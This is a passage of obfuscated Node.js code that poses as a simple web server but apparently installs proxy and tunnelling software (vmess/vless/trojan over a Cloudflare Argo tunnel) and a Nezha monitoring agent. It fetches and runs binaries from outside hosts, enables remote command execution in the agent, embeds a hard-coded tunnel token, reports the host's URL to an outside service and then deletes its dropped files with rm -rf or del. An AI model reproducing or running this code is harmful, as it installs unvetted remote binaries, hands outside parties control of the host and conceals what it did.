NEZHA_SERVER&&NEZHA_KEY&&_0x20663e[_0x4204d1(_0xc23b59._0x4bdf12)](phpPath);process[_0x4204d1(0x255)]===_0x4204d1(_0xc23b59._0x37cac5)?exec('del\x20/f\x20/q\x20'+_0x20663e['join']('\x20')+_0x4204d1(_0xc23b59._0x25f6d9),_0x147a27=>{const _0x4ce272=_0x4204d1;console[_0x4ce272(_0x20bb68._0x1c0d07)](),console[_0x4ce272(_0x20bb68._0x281e5a)](_0x4ce272(_0x20bb68._0x491f39)),console['log'](_0x4ce272(0x223));}):exec('rm\x20-rf\x20'+_0x20663e['join']('\x20')+_0x4204d1(0x214),_0x3e4bc0=>{const _0x41f9b0=_0x4204d1;console[_0x41f9b0(0x220)](),console['log'](_0x41f9b0(0x204)),console[_0x41f9b0(0x253)](_0x41f9b0(0x223));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x25efa0={_0x445eaa:0x253,_0xb3a209:0x265},_0x254c5d=_0x1447d6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x254c5d(_0x25efa0._0x445eaa)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3b5ab3=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x254c5d(_0x25efa0._0x445eaa)](_0x254c5d(_0x25efa0._0xb3a209)),_0x3b5ab3;}catch(_0x340c16){return console[_0x254c5d(0x23b)](_0x254c5d(0x1f1)+_0x340c16['message']),null;}}async function startserver(){const _0x2e59c8={_0x3e6e3e:0x23b},_0x2dee57=_0x1447d6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1389db){console[_0x2dee57(_0x2e59c8._0x3e6e3e)](_0x2dee57(0x23d),_0x1389db);}}function _0x5dd7(){const _0x1c6174=['text/plain;\x20charset=utf-8','listen','Download\x20','NEZHA_PORT','unshift','includes','Nodes\x20uploaded\x20successfully','tls','automatic\x20access\x20task\x20added\x20successfully','join','.exe\x20>\x20nul\x202>&1','443','\x0a\x20\x20tunnel:\x20','charAt','NEZHA_SERVER','message','map','127.0.0.1','status','stream','/vmess-argo?ed=2560','5683784NINtpE','2096','tunnel.json','org','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-c\x20\x22','https+local://8.8.8.8/dns-query','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','cdns.doon.eu.org','vpn.dahuangweb.xx.kg','7BobVXx','NEZHA_KEY','boot.log','abcdefghijklmnopqrstuvwxyz','eyJhIjoiZTJhNGFiZTg4YTBjNDVhN2RjZjFiMzg0OTQ5NmRjOTkiLCJ0IjoiODhhM2NmYTgtMzNiMS00OTI2LWEyNDgtNmRkZjBhOWU4YzQ2IiwicyI6IllqRTFOamxsWmpndE5qWTBZaTAwT0RRekxUZ3pNR0V0T1RNMlpHRTVNakU0T1RZeCJ9','UPLOAD_URL','length','aarch64','nohup\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','trojan','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','pipe','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlink','child_process','createWriteStream','web\x20running\x20error:\x20','https://ipapi.co/json/','toString','set','taskkill\x20/f\x20/im\x20','2053','xtls-rprx-vision','writeFileSync','\x20>/dev/null\x202>&1\x20&','9pfSqsd','sub','random','arch','34sHGnUO','\x20is\x20created','none','Error\x20reading\x20boot.log:','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','8443','stringify','data','success','2083','\x20-c\x20','\x0a\x0avmess://','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','existsSync','17321tYGQRv','NAME','send','env','post','CFPORT','Unhandled\x20error\x20in\x20startserver:','response','basename','all','?security=tls&sni=','fileUrl','Add\x20automatic\x20access\x20task\x20faild:\x20','false','win32','Empowerment\x20failed\x20for\x20','474TJgjGM','/tunnel.yml\x20run','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','14531aKwfms','https://amd64.ssss.nyc.mn/v1','readFileSync','php\x20running\x20error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','express','2783670mGGJOc','country_code','from','mkdirSync','Subscription\x20uploaded\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','App\x20is\x20running','Empowerment\x20success\x20for\x20','config.json','substring','22532qrUawI','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20-s\x20','\x0a\x20\x20credentials-file:\x20','ArgoDomain:','./tmp','has','AUTO_ACCESS','pkill\x20-f\x20\x22[','/config.json\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','list.txt','\x20>/dev/null\x202>&1','then','statSync','4056FqqRpt','PROJECT_URL','&path=%2Ftrojan-argo%3Fed%3D2560#','TunnelSecret','arm64','2622630lskXLu','countryCode','\x0aclient_secret:\x20','quic','clear','\x20successfully','\x20is\x20running','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tcp','push','base64','test','filter','true','chmod','2087','2843225TPiMYR','/vmess-argo','\x20already\x20exists','util','/sub.txt\x20saved\x20successfully','arm','https://amd64.ssss.nyc.mn/bot','http://ip-api.com/json/','vmess','firefox','get','\x20-p\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','vless','amd','error','Content-Type','Error\x20in\x20startserver:','catch','application/json','SUB_PATH','/vless-argo','Error\x20downloading\x20files:','https://amd64.ssss.nyc.mn/web','UUID','\x0a\x20\x20\x20\x20','https://arm64.ssss.nyc.mn/web','ARGO_PORT','Unknown','/api/add-subscriptions','forEach','ARGO_DOMAIN:','finish','/trojan-argo','\x0avless://','Error\x20executing\x20command:\x20','&fp=firefox&type=ws&host=','https://amd64.ssss.nyc.mn/agent','direct','log','/dev/null','platform','close','match','path','https://arm64.ssss.nyc.mn/bot','http','freedom','ARGO_DOMAIN'];_0x5dd7=function(){return _0x1c6174;};return _0x5dd7();}startserver()[_0x1447d6(0x23e)](_0x2ded4f=>{const _0x3c20e1=_0x1447d6;console[_0x3c20e1(0x23b)](_0x3c20e1(0x1eb),_0x2ded4f);}),app[_0x1447d6(0x25e)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
